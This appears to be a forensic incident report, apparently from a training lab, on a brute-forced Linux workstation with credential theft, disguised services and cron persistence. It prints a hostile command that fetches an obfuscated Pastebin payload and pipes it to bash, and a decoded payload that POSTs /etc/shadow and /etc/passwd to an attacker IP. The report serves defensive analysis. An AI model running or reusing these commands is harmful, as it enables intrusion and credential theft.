# Incident Report – LuckyShot Intrusion

## Executive Summary

- **Incident ID:** LuckyShot-IR-2025-02
  
- **Incident Severity:** High (P2)
  
- **Incident Status:** Resolved
  
- **Date of Incident:** February 10, 2025
  

### Incident Overview

On February 10, 2025, the IT Manager of **Techniqua-Solutions Corp.** discovered that multiple critical files on his workstation were missing, altered, or replaced with unfamiliar files. Suspecting unauthorized access, the issue was escalated to the security team for investigation.

A forensic analysis of the provided disk image confirmed that the system had been compromised by an external attacker. The attacker gained initial access through brute-force authentication, escalated privileges, harvested credentials, exfiltrated sensitive data, and deployed multiple persistence mechanisms. The intrusion included automated, fileless malware execution using a payload retrieved from a legitimate web service.

---

## Severity Assessment Rationale

This incident was classified as **P2 (High Severity)** due to:

- Successful unauthorized access to the system
  
- Compromise of an administrator account
  
- Exfiltration of sensitive credential files
  
- Establishment of persistence mechanisms with root privileges
  
- Automated credential theft via scheduled execution
  

---

## Affected Systems & Data

### Affected System

- **Host:** IT Manager workstation (Linux)

### Compromised Accounts

- `administrator`
  
- Attacker-created persistent account: `Regev`
  

### Data Impact

- `/etc/shadow` (password hashes)
  
- `/etc/passwd` (user account enumeration)
  
- Additional sensitive files transferred off-host
  

---

## Evidence Sources & Analysis

### Initial Access

<img width="1423" height="561" alt="bruteforce" src="https://github.com/user-attachments/assets/ee325a08-8ca7-41b9-9b09-ba4c21856e89" />


- **Access Method:** Brute-force attack
  
- **First Successful Login:** `2025-02-10 19:39:03`
  
- **Compromised Account:** `administrator`
  

System authentication logs (`/var/log/auth.log`) showed repeated failed login attempts followed by a successful login, consistent with brute-force behavior.

---

### Privilege Enumeration

<img width="529" height="445" alt="admin" src="https://github.com/user-attachments/assets/cbbb0c8d-d38a-4d92-8160-54ade89c8218" />


After gaining access, the attacker executed the following command to confirm group membership and privileges:

`groups administrator`

This confirmed administrative-level access.

---

### Credential Harvesting

<img width="884" height="668" alt="lazange" src="https://github.com/user-attachments/assets/f71c57c9-4136-4c32-876a-2b83fc7bc468" />


The first post-compromise tool downloaded by the attacker was **LaZagne**, a credential extraction utility used to recover stored credentials from the system.

---

### Data Exfiltration

<img width="884" height="398" alt="scp" src="https://github.com/user-attachments/assets/ff4e62e9-c1cf-4b08-a477-07fdebdbb971" />


- **Tool Used:** `scp`
  
- **Destination IP Address:** `192.168.161.198`
  

Sensitive files were transferred to a remote attacker-controlled system using secure copy.

---

## Malware Deployment

### Malicious Script Execution

<img width="884" height="398" alt="sys_monitor" src="https://github.com/user-attachments/assets/81f876da-311d-499c-80b9-af7a782b5dab" />


- **Script Name:** `sys_monitor.sh`

<img width="1025" height="373" alt="sys_monitor_hash" src="https://github.com/user-attachments/assets/1fc41afa-7886-4f21-9646-8086a3275c89" />

  
- **SHA1 Hash:**
  
  `3ae5dea716a4f7bfb18046bfba0553ea01021c75`
  

The script was disguised as a system monitoring utility while performing malicious actions.

---

### Malicious System Component

<img width="1294" height="390" alt="sys_component" src="https://github.com/user-attachments/assets/6c494ee8-6018-4422-bd9c-f70b7ba34867" />


- **Component Name:** `systemd-networkm.service`

This service masqueraded as a legitimate system networking component while executing with root privileges to maintain persistence.

---

## Persistence Mechanisms

### Startup Configuration Abuse

<img width="750" height="390" alt="netsniff" src="https://github.com/user-attachments/assets/253a76df-6353-4b3e-ba88-32bb7b78d783" />


The attacker modified multiple startup configuration files to spawn network listeners on login.

- **File Launching Listener on Lowest Port:** `/root/.bashrc`

Each modified file initiated a listener on a different port, providing multiple access points.

---

### Persistent User Creation

<img width="1229" height="390" alt="newUser" src="https://github.com/user-attachments/assets/45b85afe-02b5-4073-acee-6b62ead9fd3e" />


- **Created User:** `Regev`
  
- **Creation Timestamp:** `2025-02-10 20:11:21`
  

The attacker created a local user account to maintain access even if other persistence mechanisms were removed.

---

## Automated Payload Retrieval and Execution

### Full Retrieval and Execution Command

<img width="1243" height="65" alt="payload" src="https://github.com/user-attachments/assets/ee4435ba-19c2-42c5-a42b-1ebc4e6af82a" />


`command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash`

In the file `/etc/cron.d/syscheck`This command ensured `curl` was installed, retrieved an obfuscated payload from Pastebin, decoded it, and executed it directly in memory.

---

### Decoded Payload Behavior

<img width="951" height="179" alt="Decoded" src="https://github.com/user-attachments/assets/1e493814-fb54-4be2-af80-6f02ec1ab01e" />


Once decoded, the payload executed the following commands:

`base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php`

This resulted in automated, fileless exfiltration of credential data.

---

## Indicators of Compromise (IoCs)

### Network Indicators

- **Exfiltration IP:** `192.168.161.198`
  
- **Payload Hosting Service:** `pastebin.com`
  

### File Indicators

- `sys_monitor.sh`
  
- `systemd-networkm.service`
  

### Account Indicators

- `administrator`
  
- `Regev`
  

---

## Technical Timeline

| Timestamp (UTC) | Event |
| --- | --- |
| 2025-02-10 19:39:03 | First successful brute-force login |
| Shortly after | Privilege enumeration executed |
| Before 2025-02-10 19:45:32 | LaZagne downloaded |
| Later | Sensitive files exfiltrated via `scp` |
| 2025-02-10 20:11:21 | Persistent user `Regev` created |
| Later | Malicious systemd service installed |
| Ongoing | Automated credential exfiltration via cron |

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
| --- | --- | --- | --- |
| Initial Access | T1110 | Brute Force | Repeated failed logins followed by success |
| Execution | T1059.004 | Unix Shell | Malicious commands executed via `bash` |
| Persistence | T1547.006 | Startup Scripts | `.bashrc` modified to spawn listeners |
| Persistence | T1136.001 | Create Local Account | User `Regev` created |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | Administrator privileges confirmed |
| Defense Evasion | T1027 | Obfuscated Files or Information | Payload encoded with `rev` and `base64` |
| Credential Access | T1555 | Credentials from Password Stores | `/etc/shadow` accessed |
| Discovery | T1087 | Account Discovery | `/etc/passwd` exfiltrated |
| Command and Control | T1105 | Ingress Tool Transfer | Payload retrieved from Pastebin |
| Exfiltration | T1048.003 | Exfiltration Over HTTP | Data POSTed to attacker server |
| Exfiltration | T1020 | Automated Exfiltration | Cron-based execution |
| Masquerading | T1036.005 | Match Legitimate Name | Fake `systemd-networkm.service` |

---

## Impact Analysis

### Business Impact

- Risk of administrator credential compromise
  
- Potential lateral movement across corporate infrastructure
  

### Security Impact

- Demonstrates lack of brute-force protections
  
- Highlights insufficient monitoring of startup scripts and services
  
- Shows abuse of legitimate services for malware delivery
  

---

## Response and Recovery

### Immediate Response Actions

- Isolated affected system
  
- Disabled malicious services
  
- Removed attacker-created accounts
  

### Eradication Measures

- Deleted malicious startup entries
  
- Removed rogue systemd service
  
- Revoked compromised credentials
  

### Recovery Steps

- Restored system from trusted backups
  
- Enforced password resets
  
- Hardened authentication and logging controls
  

---

## Root Cause Analysis

The primary root cause was weak authentication controls that allowed brute-force access to succeed. Inadequate monitoring of startup scripts, cron jobs, and system services enabled the attacker to establish persistence. A lack of outbound traffic inspection allowed credential exfiltration to occur undetected.

---

## Lessons Learned & Recommendations

- Enforce account lockout and rate-limiting policies
  
- Monitor cron jobs and shell startup files
  
- Audit systemd services regularly
  
- Restrict outbound network traffic
  
- Improve logging and alerting for authentication events
  

---

## Conclusion

The LuckyShot incident represents a full attack lifecycle, from initial brute-force compromise to persistent, automated credential exfiltration. While the incident was successfully contained, it highlights critical gaps in authentication security, monitoring, and defense-in-depth practices that must be addressed to prevent future compromise.
